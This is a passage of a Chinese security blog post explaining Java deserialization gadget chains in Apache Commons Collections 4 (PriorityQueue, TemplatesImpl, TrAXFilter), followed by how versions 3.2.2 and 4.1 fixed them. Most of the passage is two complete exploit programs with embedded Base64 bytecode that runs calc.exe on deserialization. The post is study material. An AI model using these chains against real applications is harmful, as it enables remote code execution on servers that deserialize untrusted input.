+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAbSGVsbG9UZW1wbGF0ZXNJbXBsRGVtby5qYXZhDAARABIHACQMACUAJgEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHACcMACgAKQcAKgwAKwAsAQAIY2FsYy5leGUMAC0ALgEAFkhlbGxvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAAAkADgAAAAQAAQAPAAEACgAQAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAALAA4AAAAEAAEADwABABEAEgACAAwAAAA6AAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAQANAAAAEgAEAAAADQAEAA4ADAAQABUAEQAOAAAABAABABMAAQAUAAAAAgAV"</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure>
+<p>创建一个无害的<code>InvokerTransformer</code>对象，并用它实例化<code>Comparator</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>
+<p>还是像上面一样实例化<code>PriorityQueue</code>，但是此时像队列里添加的元素是前面创建的<code>TemplatesImpl</code>对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PriorityQueue queue new <span class="title">PriorityQueue</span><span class="params">(<span class="number">2</span>, comparator)</span></span>;</span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj);</span><br></pre></td></tr></table></figure>
+<p>这里的原因很简单，和上一篇文章一样，因为这里无法使用Transformer数组，所以不能用<code>ConstantTransformer</code>来初始化变量,需要接受外部传入的变量。而在Comparator#compare中，队列里的元素将作为作为元素传入<code>transform()</code>方法，这就是传给<code>TemplatesImpl#newTransformer</code>的参数。最后将<code>toString</code>方法改成恶意方法<code>newTransformer</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br></pre></td></tr></table></figure>
+<p>改进后的完整代码P师傅放在这里<a href="https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/CommonsCollections2TemplatesImpl.java" target="_blank" rel="noopener">传送门</a><br>我自己也改了一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2TemplatesImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAbSGVsbG9UZW1wbGF0ZXNJbXBsRGVtby5qYXZhDAARABIHACQMACUAJgEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHACcMACgAKQcAKgwAKwAsAQAIY2FsYy5leGUMAC0ALgEAFkhlbGxvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAAAkADgAAAAQAAQAPAAEACgAQAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAALAA4AAAAEAAEADwABABEAEgACAAwAAAA6AAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAQANAAAAEgAEAAAADQAEAA4ADAAQABUAEQAOAAAABAABABMAAQAUAAAAAgAV"</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行也成功。<br><img src="https://s2.loli.net/2021/12/09/QJLNIK7vsVRWYjB.png" alt="1.png"><br>同理可以利用CC3的无<code>InvokerTransformer</code>的版本也改一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2NoInvokerTransformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAbSGVsbG9UZW1wbGF0ZXNJbXBsRGVtby5qYXZhDAARABIHACQMACUAJgEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHACcMACgAKQcAKgwAKwAsAQAIY2FsYy5leGUMAC0ALgEAFkhlbGxvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAAAkADgAAAAQAAQAPAAEACgAQAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAALAA4AAAAEAAEADwABABEAEgACAAwAAAA6AAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAQANAAAAEgAEAAAADQAEAA4ADAAQABUAEQAOAAAABAABABMAAQAUAAAAAgAV"</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(TrAXFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        queue.add(TrAXFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, "transformer", new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;));</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行，同样ok。<br><img src="https://s2.loli.net/2021/12/09/EYymWsxF7S52JNT.png" alt="1.png"></p>
+<h2 id="commons-collections反序列化官方修复方法"><a href="#commons-collections反序列化官方修复方法" class="headerlink" title="commons-collections反序列化官方修复方法"></a>commons-collections反序列化官方修复方法</h2><p>大概了解了commons-collections4的几种Gadget原理，把视角放大，思考几个问题</p>
+<ul>
+<li>PriorityQueue的利用链是否支持commons-collections3中使用</li>
+<li>Apache Commons Collections官方是如何修复反序列化漏洞</li>
+</ul>
+<p>第一个问题，不能。因为这条利用链中的关键类<code>org.apache.commons.collections4.comparetors.TransformingComparator</code>，在commons-collections4.0以前版本是没有实现<code>Serializable</code>接口的，无法在反序列化中使用。<br>第二个问题，Apache Commons Collections官方在2015年底得知序列化相关问题后，就在两个分支上同时发布了新版本4.1和3.2.2 先看3.2.2 ,通过diff可以发现，新版代码中增加了一个方法用于检测反序列化是否安全。如果开发者没有配置全局<code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会抛出异常。这个检查在常见的危险Transformer类</p>
+<ul>
+<li>InstantiateTransformer</li>
+<li>InvokerTransformer</li>
+<li>PrototypeFactory</li>
+<li>CloneTransformer<br>等类的<code>readObject</code>里进行调用。所以，当我们反序列化这些对象时就会抛出一个异常：<blockquote>
+<p>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property ‘org.apache.commons.collections.enableUnsafeSerialization’ to ‘true’, but you must ensure that your application does not de-serialize objects from untrusted sources.</p>
+</blockquote>
+</li>
+</ul>
+<p>再看4.1，修复⽅式⼜不⼀样。4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了。更绝。</p>
+<h2 id="P师傅总结"><a href="#P师傅总结" class="headerlink" title="P师傅总结"></a>P师傅总结</h2><p>总结⼀下，这⼀篇介绍了commons-collections4.0相⽐于3.2.1的变化，并且改进了⽼3.2.1的Gadget，<br>让其可以在4.0中⼯作；另外，这⼀篇还介绍了⼀款新的commons-collections4利⽤链，它只能⼯作在<br>4.0版本中；最后，我们看了⼀下Apache Commons Collections官⽅对反序列化漏洞的修复⽅法及报错<br>信息，以后如果看到这样的报错，就知道是什么原因了。<br>到这⾥，CommonsCollections相关的利⽤链就讲完了，其实还有4、5、7没有说过，不过因为没有实际<br>问题涉及到这三个，所以我就不展开讲了，有兴趣可以⾃⼰研究研究。回看这⼏篇⽂章⾥讲过的<br>CommonsCollections利⽤链，会发现⼏乎没有和ysoserial中代码完全相同的，因为我的思路并不是按<br>部就班⼀⾏⾏来解释ysoserial的代码，⽽是跟随实际的思考和需求⾛，所以你会看到有对<br>CommonsCollections6的简化，有对Transformer[]数组的改造，可以说是理解了ysoserial后⾃⼰重写<br>的逻辑，这样会印象深刻很多。读者们也可以试试。<br>下⼀篇⽂章，我们⼜会再次遇到Shiro反序列化漏洞，并且深⼊地理解另外⼀个有趣的利⽤链。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/12/07/TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/" rel="next" title="TemplatesImpl在Shiro中的利用">
+                <i class="fa fa-chevron-left"></i> TemplatesImpl在Shiro中的利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#commons-collections4的改动"><span class="nav-number">1.</span> <span class="nav-text">commons-collections4的改动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PriorityQueue利用链"><span class="nav-number">2.</span> <span class="nav-text">PriorityQueue利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#改进PriorityQueue利用链"><span class="nav-number">3.</span> <span class="nav-text">改进PriorityQueue利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#commons-collections反序列化官方修复方法"><span class="nav-number">4.</span> <span class="nav-text">commons-collections反序列化官方修复方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#P师傅总结"><span class="nav-number">5.</span> <span class="nav-text">P师傅总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">193.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
